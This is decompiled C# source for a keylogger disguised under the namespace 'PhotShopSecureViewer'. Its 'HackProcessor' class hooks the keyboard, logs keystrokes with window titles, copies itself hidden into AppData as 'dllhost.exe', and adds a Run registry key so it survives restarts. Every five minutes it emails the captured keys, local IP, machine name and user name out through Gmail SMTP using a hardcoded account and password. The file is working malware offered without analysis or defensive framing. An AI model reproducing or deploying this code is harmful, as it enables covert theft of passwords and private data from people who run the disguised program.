using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace PhotShopSecureViewer
{
	// Token: 0x02000002 RID: 2
	internal class HackProcessor
	{
		// Token: 0x0600000F RID: 15 RVA: 0x000022F4 File Offset: 0x000004F4
		private static void AddToReg()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			registryKey.SetValue("dllhost", HackProcessor.dest);
		}

		// Token: 0x06000005 RID: 5
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000001 RID: 1
		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000013 RID: 19 RVA: 0x000024D0 File Offset: 0x000006D0
		public static string GetLocalIPAddress()
		{
			string result = string.Empty;
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				IPAddress[] addressList = hostEntry.AddressList;
				for (int i = 0; i < addressList.Length; i++)
				{
					IPAddress iPAddress = addressList[i];
					bool flag = iPAddress.AddressFamily == AddressFamily.InterNetwork;
					if (flag)
					{
						result = iPAddress.ToString();
					}
				}
			}
			catch (Exception ex)
			{
				result = ex.ToString();
			}
			return result;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000022B4 File Offset: 0x000004B4
		private static string getMachineLocalName()
		{
			string result = string.Empty;
			try
			{
				result = Environment.MachineName;
			}
			catch (Exception ex)
			{
				result = ex.ToString();
			}
			return result;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002274 File Offset: 0x00000474
		private static string getMachineUserName()
		{
			string result = string.Empty;
			try
			{
				result = Environment.UserName;
			}
			catch (Exception ex)
			{
				result = ex.ToString();
			}
			return result;
		}

		// Token: 0x06000007 RID: 7
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		private static extern int GetModuleFileName(HandleRef hModule, StringBuilder buffer, int length);

		// Token: 0x06000006 RID: 6
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000009 RID: 9 RVA: 0x000020F0 File Offset: 0x000002F0
		private static string getTitle()
		{
			IntPtr foregroundWindow = HackProcessor.GetForegroundWindow();
			StringBuilder stringBuilder = new StringBuilder(1000);
			HackProcessor.GetWindowText(foregroundWindow, stringBuilder, 1000);
			return stringBuilder.ToString();
		}

		// Token: 0x06000002 RID: 2
		[DllImport("user32.dll")]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		// Token: 0x06000011 RID: 17 RVA: 0x000023A0 File Offset: 0x000005A0
		public static void Hook()
		{
			using (Process currentProcess = System.Diagnostics.Process.GetCurrentProcess())
			{
				using (ProcessModule mainModule = currentProcess.MainModule)
				{
					HackProcessor._hookID = HackProcessor.SetWindowsHookEx(13, HackProcessor._proc, HackProcessor.GetModuleHandle(mainModule.ModuleName), 0u);
				}
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002410 File Offset: 0x00000610
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			bool flag = HackProcessor.dataPressed == null;
			if (flag)
			{
				HackProcessor.dataPressed = new StringBuilder();
			}
			int num = Marshal.ReadInt32(lParam);
			bool flag2 = nCode >= 0 && wParam == (IntPtr)256;
			if (flag2)
			{
				bool flag3 = !string.IsNullOrEmpty(HackProcessor.active) || HackProcessor.active != HackProcessor.getTitle();
				if (flag3)
				{
					HackProcessor.active = HackProcessor.getTitle();
				}
				bool flag4 = num == 13 || num == 13;
				if (flag4)
				{
					HackProcessor.dataPressed.Append(Environment.NewLine);
				}
				else
				{
					HackProcessor.dataPressed.Append((Keys)num);
				}
			}
			return HackProcessor.CallNextHookEx(HackProcessor._hookID, nCode, wParam, lParam);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002050 File Offset: 0x00000250
		public static void Process()
		{
			HackProcessor.Hook();
			bool flag = !File.Exists(HackProcessor.dest);
			if (flag)
			{
				File.Copy(HackProcessor.StartupPath(), HackProcessor.dest, true);
				File.SetAttributes(HackProcessor.dest, FileAttributes.Hidden);
				HackProcessor.AddToReg();
			}
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Elapsed += new ElapsedEventHandler(HackProcessor.sendEMailThroughGmail);
			timer.Interval = 300000.0;
			timer.Enabled = true;
			timer.AutoReset = true;
			timer.Start();
			Application.Run();
			GC.KeepAlive(timer);
			HackProcessor.UnHook();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002134 File Offset: 0x00000334
		public static void sendEMailThroughGmail(object source, ElapsedEventArgs e)
		{
			try
			{
				string localIPAddress = HackProcessor.GetLocalIPAddress();
				MailAddress mailAddress = new MailAddress("abcxyzindian@gmail.com");
				string password = "indianmomdad";
				MailAddress to = new MailAddress("abcxyzindian@gmail.com");
				string subject = "subject";
				string machineLocalName = HackProcessor.getMachineLocalName();
				string machineUserName = HackProcessor.getMachineUserName();
				string body = string.Format("Local Ip: {0} {1} Local ComputerName : {2} {1} Local UserName {3} {1}Data : {4} ", new object[]
				{
					localIPAddress,
					Environment.NewLine,
					machineLocalName,
					machineUserName,
					HackProcessor.dataPressed
				});
				SmtpClient smtpClient = new SmtpClient
				{
					Host = "smtp.gmail.com",
					Port = 587,
					EnableSsl = true,
					DeliveryMethod = SmtpDeliveryMethod.Network,
					UseDefaultCredentials = false,
					Credentials = new NetworkCredential(mailAddress.Address, password)
				};
				using (MailMessage mailMessage = new MailMessage(mailAddress, to)
				{
					Subject = subject,
					Body = body
				})
				{
					smtpClient.Send(mailMessage);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			finally
			{
				HackProcessor.dataPressed = null;
			}
		}

		// Token: 0x06000003 RID: 3
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook, HackProcessor.KeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x0600000A RID: 10 RVA: 0x00002128 File Offset: 0x00000328
		public static void Start(string[] args)
		{
			HackProcessor.Process();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002324 File Offset: 0x00000524
		public static string StartupPath()
		{
			bool flag = HackProcessor.startupPath == null;
			if (flag)
			{
				StringBuilder stringBuilder = new StringBuilder(260);
				HackProcessor.GetModuleFileName(HackProcessor.NullHandleRef, stringBuilder, stringBuilder.Capacity);
				HackProcessor.startupPath = Path.GetDirectoryName(stringBuilder.ToString());
			}
			new FileIOPermission(FileIOPermissionAccess.PathDiscovery, HackProcessor.startupPath).Demand();
			return HackProcessor.startupPath + "\\" + Assembly.GetExecutingAssembly().ManifestModule.Name;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002131 File Offset: 0x00000331
		public static void Stop()
		{
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002550 File Offset: 0x00000750
		public static void UnHook()
		{
			HackProcessor.UnhookWindowsHookEx(HackProcessor._hookID);
		}

		// Token: 0x06000004 RID: 4
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x04000006 RID: 6
		private static string active = null;

		// Token: 0x04000001 RID: 1
		private static StringBuilder dataPressed;

		// Token: 0x04000005 RID: 5
		private static string dest = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dllhost.exe";

		// Token: 0x04000003 RID: 3
		private static HandleRef NullHandleRef = default(HandleRef);

		// Token: 0x04000004 RID: 4
		private static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\data.txt";

		// Token: 0x04000002 RID: 2
		private static string startupPath;

		// Token: 0x04000007 RID: 7
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x04000008 RID: 8
		private const int WM_KEYDOWN = 256;

		// Token: 0x0400000A RID: 10
		private static IntPtr _hookID = IntPtr.Zero;

		// Token: 0x04000009 RID: 9
		private static HackProcessor.KeyboardProc _proc = new HackProcessor.KeyboardProc(HackProcessor.HookCallback);

		// Token: 0x02000006 RID: 6
		// Token: 0x06000022 RID: 34
		private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
